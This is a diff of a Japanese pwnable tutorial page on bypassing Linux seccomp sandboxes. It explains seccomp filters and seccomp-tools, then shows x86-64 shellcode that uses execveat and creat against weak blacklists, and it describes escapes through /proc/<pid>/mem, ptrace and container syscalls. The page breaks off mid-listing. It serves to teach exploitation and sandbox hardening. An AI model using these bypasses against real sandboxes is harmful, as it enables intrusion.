@@ -18,7 +18,13 @@
     <meta name="author" content="ptr-yudai">
 
 
+    <meta name="subtitle" content="pawnyable">
 
+
+    <meta name="description" content="Let's learn pwnable with cute animals.">
+
+
+    <meta name="keywords" content="linux,windows,kernel,browser,vm,exploit,exploitation,binary exploit,pwn,pwnable">
 
 
 
@@ -133,13 +139,17 @@ p.spoiler {
     <div class="post-info">
         <div class="post-title">
             
-            
                 seccompの回避
-            
-            
+                        
         </div>
     </div>
     <div class="h-line-primary"></div>
+    
+    
+        <div class="column" title="目次">
+            
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#seccomp"><span class="toc-text">seccomp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#seccomp%E3%81%A8%E3%81%AF"><span class="toc-text">seccompとは</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#seccomp%E3%81%AE%E4%BD%BF%E3%81%84%E6%96%B9"><span class="toc-text">seccompの使い方</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#seccomp-tools"><span class="toc-text">seccomp-tools</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A6%81%E6%AD%A2%E3%81%99%E3%81%B9%E3%81%8D%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0%E3%82%B3%E3%83%BC%E3%83%AB"><span class="toc-text">禁止すべきシステムコール</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%83%96%E3%83%A9%E3%83%83%E3%82%AF%E3%83%AA%E3%82%B9%E3%83%88%E3%81%AE%E4%B8%8D%E5%82%99"><span class="toc-text">ブラックリストの不備</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#openat%E3%81%A8execveat"><span class="toc-text">openatとexecveat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#creat%E3%81%A8procfs"><span class="toc-text">creatとprocfs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ptrace-process-vm-readv-process-vm-writev"><span class="toc-text">ptrace, process_vm_readv, process_vm_writev</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E3%82%B3%E3%83%B3%E3%83%86%E3%83%8A%E3%82%A8%E3%82%B9%E3%82%B1%E3%83%BC%E3%83%97"><span class="toc-text">コンテナエスケープ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%83%9B%E3%83%AF%E3%82%A4%E3%83%88%E3%83%9C%E3%83%83%E3%82%AF%E3%82%B9%E3%81%AE%E4%B8%8D%E5%82%99"><span class="toc-text">ホワイトボックスの不備</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%95%E6%95%B0%E3%81%AE%E7%A2%BA%E8%AA%8D%E4%B8%8D%E5%82%99"><span class="toc-text">引数の確認不備</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%82%B5%E3%82%A4%E3%83%89%E3%83%81%E3%83%A3%E3%83%8D%E3%83%AB%E6%94%BB%E6%92%83"><span class="toc-text">サイドチャネル攻撃</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E3%82%A8%E3%83%A9%E3%83%BC%E3%81%AE%E8%A6%B3%E6%B8%AC"><span class="toc-text">エラーの観測</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%A6%E7%90%86%E6%99%82%E9%96%93%E3%81%AE%E8%A8%88%E6%B8%AC"><span class="toc-text">処理時間の計測</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%82%A2%E3%83%BC%E3%82%AD%E3%83%86%E3%82%AF%E3%83%81%E3%83%A3%E3%81%A8%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0%E3%82%B3%E3%83%BC%E3%83%AB%E7%95%AA%E5%8F%B7%E3%81%AE%E6%A4%9C%E8%A8%BC%E4%B8%8D%E5%82%99"><span class="toc-text">アーキテクチャとシステムコール番号の検証不備</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E3%82%A2%E3%83%BC%E3%82%AD%E3%83%86%E3%82%AF%E3%83%81%E3%83%A3%E3%81%AE%E6%A4%9C%E8%A8%BC%E4%B8%8D%E5%82%99"><span class="toc-text">アーキテクチャの検証不備</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x32-ABI%E3%81%AE%E5%88%A9%E7%94%A8"><span class="toc-text">x32 ABIの利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%81%9D%E3%81%AE%E4%BB%96%E3%81%AE%E5%9B%9E%E9%81%BF%E6%89%8B%E6%B3%95"><span class="toc-text">その他の回避手法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%82%84%E3%83%A9%E3%82%A4%E3%83%96%E3%83%A9%E3%83%AA%E3%81%AE%E6%AC%A0%E9%99%A5%E3%81%AE%E5%88%A9%E7%94%A8"><span class="toc-text">カーネルやライブラリの欠陥の利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%96%E3%83%97%E3%83%AD%E3%82%BB%E3%82%B9%E3%81%AE%E6%82%AA%E7%94%A8"><span class="toc-text">他プロセスの悪用</span></a></li></ol></li></ol>
+        </div>
     
 </div>
 
@@ -159,9 +169,14 @@ p.spoiler {
 <li><a href="#----------">ブラックリストの不備</a>
 <ul>
 <li><a href="#openat-execveat">openatとexecveat</a></li>
-<li><a href="#open--by--handle--at--name--to--handle--at">open_by_handle_at, name_to_handle_at</a></li>
-<li><a href="#--------">実行モードの変更</a></li>
-<li><a href="#x32-------abi">x32システムコールABI</a></li>
+<li><a href="#creat-procfs">creatとprocfs</a></li>
+<li><a href="#ptrace--process--vm--readv--process--vm--writev">ptrace, process_vm_readv, process_vm_writev</a></li>
+<li><a href="#---------">コンテナエスケープ</a></li>
+</ul>
+</li>
+<li><a href="#-----------">ホワイトボックスの不備</a>
+<ul>
+<li><a href="#-------">引数の確認不備</a></li>
 </ul>
 </li>
 <li><a href="#---------">サイドチャネル攻撃</a>
@@ -170,19 +185,21 @@ p.spoiler {
 <li><a href="#-------">処理時間の計測</a></li>
 </ul>
 </li>
-<li><a href="#--------">その他の回避手法</a>
+<li><a href="#----------------------">アーキテクチャとシステムコール番号の検証不備</a>
 <ul>
-<li><a href="#trace-seccomp">TRACEとseccomp</a></li>
-<li><a href="#--------">他プロセスの悪用</a>
-<ul>
-<li><a href="#creat-procfs">creatとprocfs</a></li>
-<li><a href="#kill--tkill--tgkill">kill, tkill, tgkill</a></li>
-<li><a href="#prlimit64">prlimit64</a></li>
-<li><a href="#ptrace">ptrace</a></li>
-<li><a href="#process--vm--readv--process--vm--writev">process_vm_readv, process_vm_writev</a></li>
+<li><a href="#------------">アーキテクチャの検証不備</a></li>
+<li><a href="#x32-abi---">x32 ABIの利用</a></li>
 </ul>
 </li>
+<li><a href="#--------">その他の回避手法</a>
+<ul>
 <li><a href="#----------------">カーネルやライブラリの欠陥の利用</a></li>
+<li><a href="#--------">他プロセスの悪用</a>
+<ul>
+<li><a href="#kill--tkill--tgkill">kill, tkill, tgkill</a></li>
+<li><a href="#prlimit64">prlimit64</a></li>
+</ul>
+</li>
 </ul>
 </li>
 </ul>
@@ -192,8 +209,49 @@ p.spoiler {
 <h2 id="seccomp">seccomp</h2>
 <p>seccompの回避方法について勉強する前に、seccompの仕組みについて知っておきましょう。</p>
 <h3 id="seccompとは">seccompとは</h3>
+<p>seccompはLinuxに実装されている、システムコール呼び出しを制限するための機構です。<br>
+これを利用すると、特定のシステムコールだけを許可したり、逆に特定のシステムコールを拒否（異常終了やエラー番号返却）したりできます。</p>
+<p>Linuxには古くからネットワークパケットをフィルタリングするためのeBPFという機能がありました。<br>
+eBPFの仕組みは現在ネットワーク以外にも活用されており、seccompもこのeBPFという機能を使って実現されています。<br>
+ネットワーク用eBPFはパケットの送受信をトリガーとしてフィルタを実行しますが、seccompはシステムコール呼び出しを起点としてフィルタルールを実行します。<br>
+eBPFの<a href="../../linux-kernel/LK06/ebpf">脆弱性を悪用する講義</a>もあるのでお楽しみに！</p>
 <h3 id="seccompの使い方">seccompの使い方</h3>
+<p>seccompはeBPFのフィルタとして記述されます。<br>
+まずはこのフィルタを読み書きする方法を簡単に知っておきましょう。</p>
 <h3 id="seccomp-tools">seccomp-tools</h3>
+<p>seccompルールはアセンブリ言語のような形で記述します。<br>
+このフィルタをきちんと書くのは大変なので、<a target="_blank" rel="noopener" href="https://github.com/seccomp/libseccomp">libseccomp</a>といった簡単にルールを記述できるライブラリもあります。</p>
+<p>我々は実装するアプリケーションにseccompを取り入れたいのではなく、seccompのルールを簡単に読み書きしたいだけなので、もっと簡単なツールを使いましょう。<br>
+それが<a target="_blank" rel="noopener" href="https://github.com/david942j/seccomp-tools">seccomp-tools</a>です。以下の公式リポジトリを参考にインストールしてください。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/david942j/seccomp-tools">https://github.com/david942j/seccomp-tools</a></p>
+<p>このツールは以下の操作ができます。</p>
+<ul>
+<li>実行中のプログラムに適用されたseccompルールの表示</li>
+<li>seccompルール（フィルタ）のバイトコードの逆アセンブル</li>
+<li>seccompルール（フィルタ）のアセンブリコードのアセンブル</li>
+<li>seccompルールのエミュレート（ここでは紹介しない）</li>
+</ul>
+<p>使い方は公式リポジトリに書いてある通りです。</p>
+<p>例えば次のようなファイル<code>filter.asm</code>を用意します。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> A = sys_number</span><br><span class="line"> A == execve ? dead : next</span><br><span class="line"> A == execveat ? dead : next</span><br><span class="line"> return ALLOW</span><br><span class="line">dead:</span><br><span class="line"> return KILL</span><br></pre></td></tr></table></figure>
+<p>このルールは、まずA（レジスタの名前）に<code>sys_number</code>（呼び出されたシステムコール番号）を代入します。<br>
+次に、2,3行目でそれぞれシステムコール番号が<code>execve</code>, <code>execveat</code>であるかを確認しています。3項演算子によって、一致していればdeadに、そうれなければnext（次の命令）にジャンプします。<br>
+いずれとも一致していなければ<code>ALLOW</code>を返し、一致していればdeadにジャンプして<code>KILL</code>を返しています。</p>
+<p>これをseccomp-toolsでアセンブルしてみましょう。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ seccomp-tools asm filter.asm</span><br><span class="line">&quot; \x00\x00\x00\x00\x00\x00\x00\x15\x00\x02\x00;\x00\x00\x00\x15\x00\x01\x00B\x01\x00\x00\x06\x00\x00\x00\x00\x00\xFF\x7F\x06\x00\x00\x00\x00\x00\x00\x00&quot;</span><br></pre></td></tr></table></figure>
+<p>上記のルールが変換されたバイナリになります。他にも、例えばC言語のソースコード形式にも変換できます。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ seccomp-tools asm filter.asm -f c_source</span><br><span class="line">#include &lt;linux/seccomp.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;sys/prctl.h&gt;</span><br><span class="line"></span><br><span class="line">static void install_seccomp() &#123;</span><br><span class="line">  static unsigned char filter[] = &#123;32,0,0,0,0,0,0,0,21,0,2,0,59,0,0,0,21,0,1,0,66,1,0,0,6,0,0,0,0,0,255,127,6,0,0,0,0,0,0,0&#125;;</span><br><span class="line">  struct prog &#123;</span><br><span class="line">    unsigned short len;</span><br><span class="line">    unsigned char *filter;</span><br><span class="line">  &#125; rule = &#123;</span><br><span class="line">    .len = sizeof(filter) &gt;&gt; 3,</span><br><span class="line">    .filter = filter</span><br><span class="line">  &#125;;</span><br><span class="line">  if(prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) &lt; 0) &#123; perror(&quot;prctl(PR_SET_NO_NEW_PRIVS)&quot;); exit(2); &#125;</span><br><span class="line">  if(prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;rule) &lt; 0) &#123; perror(&quot;prctl(PR_SET_SECCOMP)&quot;); exit(2); &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>この続きとして次のソースコードを追加し、コンパイル・実行してみましょう。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  install_seccomp();</span><br><span class="line">  <span class="type">char</span> *args[] = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">  execve(args[<span class="number">0</span>], args, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>まずはseccomp-toolsでルールを確認します。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ seccomp-tools dump ./a.out </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0004</span><br><span class="line"> 0002: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0004</span><br><span class="line"> 0003: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0004: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>
+<p>書いたルールと一致していることが分かります。dumpコマンドはseccompルールがprctlで適用される瞬間をフックしているので、該当箇所までプログラムを動かさないとダンプは表示されません。</p>
+<p>さて、プログラムを実行すると強制終了するはずです。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./a.out </span><br><span class="line">間違ったシステムコール (コアダンプ)</span><br></pre></td></tr></table></figure>
+<p>dmesgを見ると次のようなログが残っています。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[18262.311828] audit: type=1400 audit(1684681201.394:39): apparmor=&quot;DENIED&quot; operation=&quot;capable&quot; class=&quot;cap&quot; profile=&quot;/usr/sbin/cupsd&quot; pid=24470 comm=&quot;cupsd&quot; capability=12  capname=&quot;net_admin&quot;</span><br><span class="line">[20937.741402] audit: type=1326 audit(1684683876.811:40): auid=1000 uid=1000 gid=1000 ses=3 subj=unconfined pid=27128 comm=&quot;a.out&quot; exe=&quot;/path/to/a.out&quot; sig=31 arch=c000003e syscall=59 compat=0 ip=0x7fa5050eb0fb code=0x0</span><br></pre></td></tr></table></figure>
+<p>注目すべきは<code>syscall=59</code>の部分です。59番は<code>execve</code>なので、このシステムコールがseccompルールに弾かれて異常終了していることが分かります。</p>
+<p>このように、seccompルールを使うと、呼び出されたシステムコールの番号や、引数の値によってシステムコールの発行を許可・拒否できます。</p>
 <h3 id="禁止すべきシステムコール">禁止すべきシステムコール</h3>
 <p>では、seccompを使ってどのようなシステムコールを禁止すれば良いのでしょうか。プログラムや保護したいものによりますが、一般的には任意コマンド実行や任意ファイル読み書きを防ぐ目的で使われます。<br>
 コマンド実行に関しては次のシステムコールを禁止すれば十分です。</p>
@@ -206,6 +264,7 @@ p.spoiler {
 <li><code>creat</code></li>
 <li><code>open</code></li>
 <li><code>openat</code></li>
+<li><code>openat2</code> (Linux 5.6以降で追加)</li>
 </ul>
 <p>もしプログラムがroot権限で動いているなら、ファイルopenに関して次のシステムコールも禁止する必要があります。（当然root権限の場合は他にもたくさんのシステムコールを禁止しないといけないです。）</p>
 <ul>
@@ -220,27 +279,74 @@ p.spoiler {
 <li><code>prlimit64</code></li>
 </ul>
 <p>などさまざまなシステムコールを禁止する必要があります。<br>
-このように、seccompをブラックリスト方式で適切に使うのは面倒です。そのため、特別な理由がない限りはプログラムが使う安全なシステムコールのみを許可するホワイトリスト方式で使用しましょう。</p>
+このように、seccompをブラックリスト方式で使うのは非常に大変です。そのため、特別な理由がない限りはプログラムが使う安全なシステムコールのみを許可するホワイトリスト方式で使用しましょう。</p>
 <h2 id="ブラックリストの不備">ブラックリストの不備</h2>
 <p>ここからはseccompの回避方法について説明します。まず、ブラックリスト方式を利用した際の不備を悪用する方法を紹介します。</p>
+<p>ここからはたくさんのseccompルールが登場します。毎回書きたくない方は<a href="">LU-seccomp</a>をダウンロードしてください。以下のように使えます。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ make 01-filter    <span class="comment"># filter.binを生成</span></span><br><span class="line">$ ./lu-seccomp</span><br><span class="line">&lt;ここにシェルコードを入力&gt;</span><br><span class="line">$ python test.py    <span class="comment"># ptrlibでシェルコードを実行</span></span><br></pre></td></tr></table></figure>
 <h3 id="openatとexecveat">openatとexecveat</h3>
-<p>また、<code>openat2</code></p>
-<h3 id="open-by-handle-at-name-to-handle-at">open_by_handle_at, name_to_handle_at</h3>
-<h3 id="実行モードの変更">実行モードの変更</h3>
-<h3 id="x32システムコールABI">x32システムコールABI</h3>
+<p>まず典型的なミスは、<code>execve</code>や<code>open</code>だけ禁止して、<code>execveat</code>や<code>openat</code>などの同等の機能を備えたマイナーなシステムコールを禁止し忘れるパターンです。<br>
+次のルール（<code>01-filter</code>）を見てみましょう。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ make 01-filter</span><br><span class="line">$ seccomp-tools dump ./lu-seccomp</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x04 0xc000003e  if (A != ARCH_X86_64) goto 0006</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x02 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0006</span><br><span class="line"> 0004: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0006</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>
+<p><code>execve</code>を禁止していますが、<code>execveat</code>が許可されています。したがって、次のようなコードで任意コマンド実行できます。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">xor r10d, r10d</span><br><span class="line">xor eax, eax</span><br><span class="line">push rax</span><br><span class="line">lea rsi, [rel argv1]</span><br><span class="line">push rsi</span><br><span class="line">lea rsi, [rel argv0]</span><br><span class="line">push rsi</span><br><span class="line">mov rdx, rsp</span><br><span class="line">mov edi, -100</span><br><span class="line">mov eax, &#123;syscall.x64.execveat&#125;</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">argv0: db &quot;/bin/ls&quot;, 0</span><br><span class="line">argv1: db &quot;-lha&quot;, 0</span><br></pre></td></tr></table></figure>
+<p>なお、<strong>seccompルールは子プロセスにも引き継がれる</strong>ため、<code>/bin/sh</code>のように内部で<code>execve</code>を使うプログラムは起動しても意味がありません。</p>
+<h3 id="creatとprocfs">creatとprocfs</h3>
+<p>次のルール（<code>02-filter</code>）を見てみましょう。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ make 02-filter</span><br><span class="line">$ seccomp-tools dump ./lu-seccomp </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x04 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0008</span><br><span class="line"> 0004: 0x15 0x03 0x00 0x00000002  if (A == open) goto 0008</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x00000101  if (A == openat) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x000001b5  if (A == 0x1b5) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>
+<p>seccomp-toolsは新しいシステムコールをうまく表示できないことがありますが、line 6は<code>openat2</code>を禁止しています。<code>creat</code>が禁止されていないので、これを使ってファイルが読めるでしょうか。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">mov esi, 0400</span><br><span class="line">lea rdi, [rel pathname]</span><br><span class="line">mov eax, &#123;syscall.x64.creat&#125;</span><br><span class="line">syscall</span><br><span class="line">test rax, rax</span><br><span class="line">jl error</span><br><span class="line"></span><br><span class="line">mov edx, 0x100</span><br><span class="line">mov rsi, rsp</span><br><span class="line">mov edi, eax</span><br><span class="line">mov eax, &#123;syscall.x64.read&#125;</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov edx, 0x100</span><br><span class="line">mov rsi, rsp</span><br><span class="line">mov edi, 1</span><br><span class="line">mov eax, &#123;syscall.x64.write&#125;</span><br><span class="line">syscall</span><br><span class="line">hlt</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line">mov edx, 17</span><br><span class="line">lea rsi, [rel s_warn]</span><br><span class="line">mov edi, 1</span><br><span class="line">mov eax, &#123;syscall.x64.write&#125;</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">s_warn: db &quot;Cannot open file&quot;, 0x0a, 0</span><br><span class="line">pathname: db &quot;/etc/issue&quot;, 0</span><br></pre></td></tr></table></figure>
+<p>残念ながら通常ファイルを読むことはできません。<code>creat</code>は新規で空ファイルを生成するため、ファイルの内容が空になってしまいます。上の例では書き換え権限がないファイルを開こうとするためエラーになります。（書き換え可能な一般ファイルを指定すると中身が空になるので注意してください。）</p>
+<p>しかし、<code>fork</code>型プロセスで親プロセスと子プロセスが通信するタイプのシステムで子プロセスのみにseccompがかかっている場合、親プロセスの<code>/proc/&lt;pid&gt;/mem</code>を開くことができます。この場合、seccompがかかっていない親プロセスのメモリを書き換えられるため、サンドボックス回避に成功します。<br>
+このように、<code>fork</code>型のシステムでは<code>open</code>系のシステムコールを使い、procfs経由で親プロセスを操作できるため注意が必要です。</p>
+<p>また、プログラムが<code>CAP_DAC_READ_SEARCH</code>権限を持っている場合、同様にファイルをオープンできる<code>open_by_handle_at</code>システムコールも禁止しなくてはなりません。</p>
+<h3 id="ptrace-process-vm-readv-process-vm-writev">ptrace, process_vm_readv, process_vm_writev</h3>
+<p>procfsの例と同様に、<code>fork</code>親プロセスのメモリやレジスタを操作できるシステムコールがいくつかあります。</p>
+<p><code>ptrace</code>はプロセスを操作する代表的なシステムコールです。メモリの読み書きだけでなくレジスタの操作やステップ実行などプロセスに対するあらゆる操作が可能です。<code>ptrace</code>が禁止されていない場合、通常<code>fork</code>型では親プロセスを操作できます。<br>
+同様に、<code>process_vm_readv</code>, <code>process_vm_writev</code>というシステムコールがあります。これらは名前の通りプロセスのメモリを読み書きするためのシステムコールで、<code>ptrace</code>と同様に禁止を忘れると、<code>fork</code>型の場合親プロセスのメモリを操作できます。</p>
+<p>以上は直接的にプロセスのメモリを操作するシステムコールですが、他のプロセスに影響を与えるシステムコールは他にも多数あります。<br>
+代表的なものは<code>kill</code>, <code>prlimit64</code>などで、いずれも直接exploitには活用できませんが、状況によってはサンドボックス回避に役立ちます。pidを引数に取るようなシステムコールには注意しましょう。</p>
+<h3 id="コンテナエスケープ">コンテナエスケープ</h3>
+<p>どうしてもブラックリストルールを使う必要がある例として、dockerのようなコンテナが挙げられます。さまざまなユーザープログラムが動くコンテナでは、特定のシステムコールだけを利用可能にすることは非現実的です。</p>
+<p>root権限を明け渡す可能性が高いコンテナでは、より多くのシステムコールを禁止する必要があります。<br>
+例えば<code>ptrace</code>を許可してしまうとルートプロセスを乗っ取られてしまったり、<code>open_by_handle_at</code>が使えるとコンテナの外側のファイルを操作できてしまったり<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>というコンテナエスケープの脆弱性に繋がります。</p>
+<p>コンテナが禁止すべきシステムコールは以下のDockerドキュメントを参考にすると良いです。</p>
+<p><a target="_blank" rel="noopener" href="https://docs.docker.com/engine/security/seccomp/">https://docs.docker.com/engine/security/seccomp/</a></p>
+<h2 id="ホワイトボックスの不備">ホワイトボックスの不備</h2>
+<p>ホワイトボックスルールでも、当然これまで述べてきたような悪用されやすいシステムコールが許可されていれば問題になります。<br>
+それ以外にも、引数の検証で安全性を担保しようとすると、ミスが発生しやすいです。</p>
+<h3 id="引数の確認不備">引数の確認不備</h3>
+<p>3番目のルールを確認してみましょう。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ make 03-filter</span><br><span class="line">$ seccomp-tools dump ./lu-seccomp </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x04 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0008</span><br><span class="line"> 0004: 0x15 0x0a 0x00 0x00000002  if (A == open) goto 0015</span><br><span class="line"> 0005: 0x15 0x09 0x00 0x00000003  if (A == close) goto 0015</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0009</span><br><span class="line"> 0007: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0012</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0009: 0x20 0x00 0x00 0x00000010  A = fd # read(fd, buf, count)</span><br><span class="line"> 0010: 0x15 0x04 0x00 0x00000000  if (A == 0x0) goto 0015</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0012: 0x20 0x00 0x00 0x00000010  A = fd # write(fd, buf, count)</span><br><span class="line"> 0013: 0x15 0x01 0x00 0x00000001  if (A == 0x1) goto 0015</span><br><span class="line"> 0014: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span 